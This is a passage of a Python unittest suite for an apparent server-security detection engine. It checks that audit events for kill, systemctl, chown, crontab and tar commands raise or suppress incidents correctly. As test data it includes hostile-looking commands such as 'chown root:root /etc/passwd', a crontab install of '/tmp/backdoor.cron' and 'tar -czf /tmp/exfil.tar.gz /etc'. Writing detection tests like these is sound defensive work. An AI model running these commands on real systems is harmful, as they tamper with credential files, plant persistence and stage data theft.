                    (json.dumps([{"id": "proc:tomcat-tomcat", "name": "Tomcat", "unit_name": "", "pid": 837954, "status": "running"}]),)
                )
        db.save_detected_services(
            server_id=14,
            services_list=[{"id": "proc:tomcat-tomcat", "name": "Tomcat", "unit_name": "", "pid": None, "status": "stopped"}],
            event_ts=ts + 2.0,
        )
        merged = self._fetch_open_incidents(14)
        self.assertEqual(len(merged), 1, f"Interactive kill -9 <pid> must merge with service_stopped, got {merged}")
        self.assertEqual(merged[0]["severity"], "critical")
        self.assertIn("Service Terminated", merged[0]["title"])
        self.assertIn("kill -9 837954", merged[0]["title"])
        self.assertIn("govind.b", merged[0]["title"])

    def test_service_control_systemctl_filtering_and_correlation(self):
        """
        Verify interactive `systemctl` (`service_control`) ignores read-only `systemctl status ssh`,
        alerts CRITICAL on `systemctl restart ssh`, and merges `systemctl stop tomcat` with `service_stopped`.
        """
        ts = time.time() - 3.0
        st_hex = "systemctl\x00status\x00ssh".encode("utf-8").hex()
        rst_hex = "systemctl\x00restart\x00ssh".encode("utf-8").hex()
        stop_hex = "systemctl\x00stop\x00tomcat".encode("utf-8").hex()

        with patch.object(app_module, "_is_rule_enabled", return_value=True):
            app_module._check_unified_fim(14, {
                "audit_events": [{
                    "serial": 9301,
                    "epoch": ts,
                    "key": "service_control",
                    "auid": "1002",
                    "username": "govind.b",
                    "comm": "systemctl",
                    "exe": "/usr/bin/systemctl",
                    "line": f'type=SYSCALL msg=audit({ts:.3f}:9301): auid=1002 comm="systemctl" exe="/usr/bin/systemctl" key="service_control" proctitle={st_hex}',
                }],
                "file_changes": [],
            })
            self.assertEqual(len(self._fetch_open_incidents(14)), 0, "systemctl status must not alert")

            app_module._check_unified_fim(14, {
                "audit_events": [{
                    "serial": 9302,
                    "epoch": ts + 1.0,
                    "key": "service_control",
                    "auid": "1002",
                    "username": "govind.b",
                    "comm": "systemctl",
                    "exe": "/usr/bin/systemctl",
                    "line": f'type=SYSCALL msg=audit({ts+1:.3f}:9302): auid=1002 comm="systemctl" exe="/usr/bin/systemctl" key="service_control" proctitle={rst_hex}',
                }],
                "file_changes": [],
            })

            incs_14 = self._fetch_open_incidents(14)
            self.assertEqual(len(incs_14), 1)
            self.assertEqual(incs_14[0]["severity"], "critical")
            self.assertIn("systemctl restart ssh", incs_14[0]["title"])
            self.assertIn("govind.b", incs_14[0]["title"])

            app_module._check_unified_fim(15, {
                "audit_events": [{
                    "serial": 9303,
                    "epoch": ts,
                    "key": "service_control",
                    "auid": "1002",
                    "username": "govind.b",
                    "comm": "systemctl",
                    "exe": "/usr/bin/systemctl",
                    "line": f'type=SYSCALL msg=audit({ts:.3f}:9303): auid=1002 comm="systemctl" exe="/usr/bin/systemctl" key="service_control" proctitle={stop_hex}',
                }],
                "file_changes": [],
            })

        with db.get_db_connection() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "UPDATE servers SET detected_services = %s WHERE id = 15;",
                    (json.dumps([{"id": "systemd:tomcat", "name": "Tomcat", "unit_name": "tomcat.service", "pid": 4412, "status": "running"}]),)
                )
        db.save_detected_services(
            server_id=15,
            services_list=[{"id": "systemd:tomcat", "name": "Tomcat", "unit_name": "tomcat.service", "pid": None, "status": "stopped"}],
            event_ts=ts + 2.0,
        )
        incs_15 = self._fetch_open_incidents(15)
        self.assertEqual(len(incs_15), 1, f"systemctl stop tomcat + service_stopped must merge into 1 incident, got {incs_15}")
        self.assertEqual(incs_15[0]["severity"], "critical")
        self.assertIn("Service Terminated", incs_15[0]["title"])
        self.assertIn("systemctl stop tomcat", incs_15[0]["title"])
        self.assertIn("govind.b", incs_15[0]["title"])

    def test_killed_pid_resolves_tomcat_postgres_path_and_obj_pid(self):
        """
        Verify `kill -9 <pid>` automatically resolves WHICH service & instance path was killed:
        - Distinguishes multi-instance Tomcats (`/application/vcloud/apache-tomcat-9.0.98` vs `/application/ticket_raising/...`)
          even if port 8080 reused a new PID in the next push before detection ran.
        - Resolves PostgreSQL data directory (`/var/lib/postgresql/15/main`) and port (`5432`).
        - Resolves ephemeral (<15s) processes via kernel `type=OBJ_PID` `ocomm="sleep"`.
        - Renders target & path in both incident evidence_data and SES email HTML.
        """
        ts = time.time() - 3.0
        bash_hex = "-bash".encode("utf-8").hex()

        # Push N-1: two Tomcats + PostgreSQL live on server 14
        db.save_agent_data(14, {
            "cpu_percent": 5.0,
            "memory_percent": 20.0,
            "disk_percent": 15.0,
            "open_ports": [
                {
                    "port": 8080, "proto": "tcp", "process": "java", "pid": 1070958, "user": "govind.b",
                    "cmdline": "/usr/lib/jvm/java-8-openjdk-amd64/bin/java -Djava.util.logging.config.file=/application/vcloud/apache-tomcat-9.0.98/conf/l...",
                },
                {
                    "port": 8081, "proto": "tcp", "process": "java", "pid": 788415, "user": "sateesh.j",
                    "cmdline": "/usr/lib/jvm/java-8-openjdk-amd64/bin/java -Djava.util.logging.config.file=/application/ticket_raising/apache-tomcat-9.0...",
                },
                {
                    "port": 5432, "proto": "tcp", "process": "postgres", "pid": 2044, "user": "postgres",
                    "cmdline": "/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/15/main -c config_file=/etc/postgresql/15/main/postgresq...",
                },
            ],
            "processes": [
                {"pid": "1070958", "user": "govind.b", "cpu": 1.2, "memory": 4.0, "name": "/usr/lib/jvm/java-8-openjdk-amd64/bin/java -Djava.util.logging.config.file=/ap"},
            ],
        })

        # Push N: Tomcat restarted quickly on port 8080 -> port 8080 already shows NEW PID 1081234 BEFORE run_detection_engine!
        db.save_agent_data(14, {
            "cpu_percent": 4.0,
            "memory_percent": 20.0,
            "disk_percent": 15.0,
            "open_ports": [
                {
                    "port": 8080, "proto": "tcp", "process": "java", "pid": 1081234, "user": "govind.b",
                    "cmdline": "/usr/lib/jvm/java-8-openjdk-amd64/bin/java -Djava.util.logging.config.file=/application/vcloud/apache-tomcat-9.0.98/conf/l...",
                },
            ],
        })

        pid_tomcat_hex = f"{1070958:x}"
        pid_pg_hex = f"{2044:x}"
        pid_sleep_hex = f"{998811:x}"

        with patch.object(app_module, "_is_rule_enabled", return_value=True):
            app_module._check_unified_fim(14, {
                "audit_events": [
                    {
                        "serial": 9501, "epoch": ts, "key": "process_kill", "auid": "1742601308",
                        "username": "mannan.shariff", "effective_user": "govind.b", "comm": "bash", "exe": "/usr/bin/bash",
                        "line": (
                            f'type=SYSCALL msg=audit({ts:.3f}:9501): arch=c000003e syscall=62 success=yes exit=0 '
                            f'a0={pid_tomcat_hex} a1=9 auid=1742601308 uid=1002 pid=1079600 comm="bash" exe="/usr/bin/bash" '
                            f'key="process_kill" type=OBJ_PID msg=audit({ts:.3f}:9501): opid=1070958 ouid=1002 ocomm="java" '
                            f'type=PROCTITLE proctitle={bash_hex}'
                        ),
                    },
                    {
                        "serial": 9502, "epoch": ts + 1.0, "key": "process_kill", "auid": "1742601308",
                        "username": "mannan.shariff", "effective_user": "root", "comm": "bash", "exe": "/usr/bin/bash",
                        "line": (
                            f'type=SYSCALL msg=audit({ts+1:.3f}:9502): arch=c000003e syscall=62 success=yes exit=0 '
                            f'a0={pid_pg_hex} a1=9 auid=1742601308 uid=0 pid=1079601 comm="bash" exe="/usr/bin/bash" '
                            f'key="process_kill" type=PROCTITLE proctitle={bash_hex}'
                        ),
                    },
                    {
                        "serial": 9503, "epoch": ts + 2.0, "key": "process_kill", "auid": "1742601308",
                        "username": "mannan.shariff", "effective_user": "govind.b", "comm": "bash", "exe": "/usr/bin/bash",
                        "line": (
                            f'type=SYSCALL msg=audit({ts+2:.3f}:9503): arch=c000003e syscall=62 success=yes exit=0 '
                            f'a0={pid_sleep_hex} a1=9 auid=1742601308 uid=1002 pid=1079602 comm="bash" exe="/usr/bin/bash" '
                            f'key="process_kill" type=OBJ_PID msg=audit({ts+2:.3f}:9503): opid=998811 ouid=1002 ocomm="sleep" '
                            f'type=PROCTITLE proctitle={bash_hex}'
                        ),
                    },
                ],
                "file_changes": [],
            })

        incs = [i for i in self._fetch_open_incidents(14) if "AUDIT_PROCESS_KILL" in (i.get("dedup_key") or "")]
        self.assertEqual(len(incs), 3, f"Expected 3 distinct killed-PID incidents, got {incs}")

        by_title = {i["title"]: json.loads(i["evidence_data"] or "{}") for i in incs}
        tomcat_match = [(t, ev) for t, ev in by_title.items() if "1070958" in t]
        pg_match = [(t, ev) for t, ev in by_title.items() if "2044" in t]
        sleep_match = [(t, ev) for t, ev in by_title.items() if "998811" in t]

        self.assertEqual(len(tomcat_match), 1)
        t_title, t_ev = tomcat_match[0]
        self.assertIn("Tomcat: /application/vcloud/apache-tomcat-9.0.98", t_title)
        self.assertEqual(t_ev.get("target_service"), "Tomcat")
        self.assertEqual(t_ev.get("target_instance_path"), "/application/vcloud/apache-tomcat-9.0.98")
        self.assertEqual(t_ev.get("target_ports"), [8080])
        self.assertEqual(t_ev.get("target_user"), "govind.b")
        self.assertEqual(t_ev.get("target_pid"), 1070958)

        self.assertEqual(len(pg_match), 1)
        p_title, p_ev = pg_match[0]
        self.assertIn("PostgreSQL: /var/lib/postgresql/15/main", p_title)
        self.assertEqual(p_ev.get("target_service"), "PostgreSQL")
        self.assertEqual(p_ev.get("target_instance_path"), "/var/lib/postgresql/15/main")
        self.assertEqual(p_ev.get("target_ports"), [5432])

        self.assertEqual(len(sleep_match), 1)
        s_title, s_ev = sleep_match[0]
        self.assertIn("kill -9 998811 -> sleep", s_title)
        self.assertEqual(s_ev.get("target_service"), "sleep")
        self.assertEqual(s_ev.get("target_pid"), 998811)

        html = ses_mailer.build_alert_html(
            alert_id=3480,
            alert_title=t_title,
            alert_type="AUDIT_PROCESS_KILL",
            message=t_ev.get("why_it_fired", ""),
            severity="CRITICAL",
            timestamp="2026-11-26 16:40:00",
            server_ip="192.168.150.23",
            hostname="JVVNL- Vcloudengine -2",
            llm_data=None,
        )
        self.assertIn("Target:", html)
        self.assertIn("/application/vcloud/apache-tomcat-9.0.98", html)

    def test_no_false_positives_on_fchown_sudo_or_pg_truncate_logs_while_tomcat_oom_alerts(self):
        """
        Verify:
        1) Raw auditd `SYSCALL=fchown ... UID="root"` with bash `proctitle=-bash` and benign `sudo su`
           do NOT fire `Ownership Changed to Root` (CHOWN_ROOT).
        2) Actual CLI `chown root:root /etc/passwd` still triggers CHOWN_ROOT with decoded command text.
        3) Generic `"TRUNCATE"` / `DROP TABLE` log lines do NOT fire `PG_DB_DELETED` on Server SIEM,
           while Tomcat `catalina.out` `OutOfMemoryError` STILL triggers CRITICAL `TOMCAT_CRITICAL_ERROR`
           (and OS logs mentioning `tomcat` do not trigger Tomcat errors).
        """
        ts = time.time() - 2.0
        bash_hex = "-bash".encode("utf-8").hex()
        chown_hex = "chown\x00root:root\x00/etc/passwd".encode("utf-8").hex()

        with patch.object(app_module, "_is_rule_enabled", return_value=True):
            # 1) fchown + sudo su + random "TRUNCATE" log + OS syslog mentioning tomcat OutOfMemoryError -> 0 incidents!
            app_module._check_sudo_misuse(14, {
                "sudo_events": [
                    {"user": "mannan.shariff", "line": "Nov 26 18:10:00 host sudo: mannan.shariff : TTY=pts/1 ; USER=root ; COMMAND=/bin/su"},
                ],
                "audit_events": [{
                    "serial": 9601, "epoch": ts, "key": "perm_mod", "auid": "1742601308",
                    "username": "mannan.shariff", "comm": "bash", "exe": "/usr/bin/bash",
                    "line": f'type=SYSCALL msg=audit({ts:.3f}:9601): syscall=93 success=yes auid=1742601308 comm="bash" exe="/usr/bin/bash" key="perm_mod" ARCH=x86_64 SYSCALL=fchown AUID="mannan.shariff" UID="root" EUID="root" type=PROCTITLE proctitle={bash_hex}',
                }],
                "log_lines": [],
            })
            app_module._analyze_application_and_db_logs(14, {
                "logs": [
                    {"line": '"TRUNCATE"', "source": "/application/ticket/catalina.out", "log_type": "tomcat"},
                    {"line": "DROP TABLE audit_temp;", "source": "/var/log/syslog", "log_type": "os"},
                    {"line": "java.lang.OutOfMemoryError mentioning tomcat user session", "source": "/var/log/syslog", "log_type": "os"},
                ],
                "log_lines": ['"TRUNCATE"', "GRANT ALL PRIVILEGES ON test.*"],
            })

            self.assertEqual(len(self._fetch_open_incidents(14)), 0, f"Unexpected FP incidents: {self._fetch_open_incidents(14)}")

            # 2) Genuine CLI `chown root:root /etc/passwd` + real Tomcat OutOfMemoryError -> 2 CRITICAL incidents
            app_module._check_sudo_misuse(15, {
                "audit_events": [{
                    "serial": 9602, "epoch": ts + 1.0, "key": "perm_mod", "auid": "1742601308",
                    "username": "mannan.shariff", "comm": "chown", "exe": "/usr/bin/chown",
                    "line": f'type=SYSCALL msg=audit({ts+1:.3f}:9602): syscall=92 auid=1742601308 comm="chown" exe="/usr/bin/chown" key="perm_mod" UID="root" type=PROCTITLE proctitle={chown_hex}',
                }],
            })
            app_module._analyze_application_and_db_logs(15, {
                "logs": [
                    {"line": "Exception in thread main java.lang.OutOfMemoryError: Java heap space", "source": "/application/vcloud/catalina.out", "log_type": "tomcat"},
                ],
            })

        incs_15 = self._fetch_open_incidents(15)
        self.assertEqual(len(incs_15), 2, f"Expected CHOWN_ROOT + TOMCAT_CRITICAL_ERROR, got {incs_15}")
        titles = [i["title"] for i in incs_15]
        descs = [i["description"] for i in incs_15]
        self.assertTrue(any("Ownership Changed to Root" in t for t in titles))
        self.assertTrue(any("chown root:root /etc/passwd" in d for d in descs))
        self.assertTrue(any("Application Fatal Error Alert" in t for t in titles))
        self.assertTrue(all(i["severity"] == "critical" for i in incs_15))

    def test_readonly_crontab_list_and_daemon_tar_extract_filters(self):
        """
        Verify:
        - Read-only `crontab -l` / `crontab -u root -l` produces 0 incidents (daemon or human),
          while `crontab -e` and `crontab /tmp/backdoor.cron` still fire CRITICAL.
        - Background daemon (`AUID: 4294967295`) `tar -x -f - --warning=no-timestamp` (dpkg) and `tar -xzf`
          produce 0 incidents, while `tar -czf` (creation/exfil) and human `tar` still fire CRITICAL.
        """
        ts = time.time() - 3.0
        cron_l_hex = "crontab\x00-l".encode("utf-8").hex()
        cron_ul_hex = "crontab\x00-u\x00root\x00-l".encode("utf-8").hex()
        tar_dpkg_hex = "tar\x00-x\x00-f\x00-\x00--warning=no-timestamp".encode("utf-8").hex()
        tar_xzf_hex = "tar\x00-xzf\x00/tmp/pkg.tar.gz".encode("utf-8").hex()

        cron_e_hex = "crontab\x00-e".encode("utf-8").hex()
        cron_file_hex = "crontab\x00/tmp/backdoor.cron".encode("utf-8").hex()
        tar_create_hex = "tar\x00-czf\x00/tmp/exfil.tar.gz\x00/etc".encode("utf-8").hex()

        with patch.object(app_module, "_is_rule_enabled", return_value=True):
            app_module._check_unified_fim(14, {
                "audit_events": [
                    {"serial": 9701, "epoch": ts, "key": "scheduled_tasks_cmd", "auid": "4294967295", "username": "root", "comm": "crontab", "exe": "/usr/bin/crontab", "line": f'type=SYSCALL msg=audit({ts:.3f}:9701): auid=4294967295 comm="crontab" exe="/usr/bin/crontab" key="scheduled_tasks_cmd" proctitle={cron_l_hex}'},
                    {"serial": 9702, "epoch": ts + 1, "key": "scheduled_tasks_cmd", "auid": "1742601308", "username": "mannan.shariff", "comm": "crontab", "exe": "/usr/bin/crontab", "line": f'type=SYSCALL msg=audit({ts+1:.3f}:9702): auid=1742601308 comm="crontab" exe="/usr/bin/crontab" key="scheduled_tasks_cmd" proctitle={cron_ul_hex}'},
                    {"serial": 9703, "epoch": ts + 2, "key": "archive_staging", "auid": "4294967295", "username": "root", "comm": "tar", "exe": "/usr/bin/tar", "line": f'type=SYSCALL msg=audit({ts+2:.3f}:9703): auid=4294967295 comm="tar" exe="/usr/bin/tar" key="archive_staging" proctitle={tar_dpkg_hex}'},
                    {"serial": 9704, "epoch": ts + 3, "key": "archive_staging", "auid": "4294967295", "username": "root", "comm": "tar", "exe": "/usr/bin/tar", "line": f'type=SYSCALL msg=audit({ts+3:.3f}:9704): auid=4294967295 comm="tar" exe="/usr/bin/tar" key="archive_staging" proctitle={tar_xzf_hex}'},
                ],
                "file_changes": [],
            })
            self.assertEqual(len(self._fetch_open_incidents(14)), 0, f"Expected 0 incidents for benign crontab -l / dpkg tar -x, got {self._fetch_open_incidents(14)}")

            app_module._check_unified_fim(15, {
                "audit_events": [
                    {"serial": 9711, "epoch": ts, "key": "scheduled_tasks_cmd", "auid": "1742601308", "username": "mannan.shariff", "comm": "crontab", "exe": "/usr/bin/crontab", "line": f'type=SYSCALL msg=audit({ts:.3f}:9711): auid=1742601308 comm="crontab" exe="/usr/bin/crontab" key="scheduled_tasks_cmd" proctitle={cron_e_hex}'},
                    {"serial": 9712, "epoch": ts + 1, "key": "scheduled_tasks_cmd", "auid": "4294967295", "username": "root", "comm": "crontab", "exe": "/usr/bin/crontab", "line": f'type=SYSCALL msg=audit({ts+1:.3f}:9712): auid=4294967295 comm="crontab" exe="/usr/bin/crontab" key="scheduled_tasks_cmd" proctitle={cron_file_hex}'},
                    {"serial": 9713, "epoch": ts + 2, "key": "archive_staging", "auid": "4294967295", "username": "root", "comm": "tar", "exe": "/usr/bin/tar", "line": f'type=SYSCALL msg=audit({ts+2:.3f}:9713): auid=4294967295 comm="tar" exe="/usr/bin/tar" key="archive_staging" proctitle={tar_create_hex}'},
                    {"serial": 9714, "epoch": ts + 3, "key": "archive_staging", "auid": "1742601308", "username": "mannan.shariff", "comm": "tar", "exe": "/usr/bin/tar", "line": f'type=SYSCALL msg=audit({ts+3:.3f}:9714): auid=1742601308 comm="tar" exe="/usr/bin/tar" key="archive_staging" proctitle={tar_dpkg_hex}'},
                ],
                "file_changes": [],
            })

        incs_15 = self._fetch_open_incidents(15)
        self.assertEqual(len(incs_15), 4, f"Expected all 4 genuine cron edit / tar create / human tar incidents, got {incs_15}")
        self.assertTrue(all(i["severity"] == "critical" for i in incs_15))


if __name__ == "__main__":
    unittest.main()
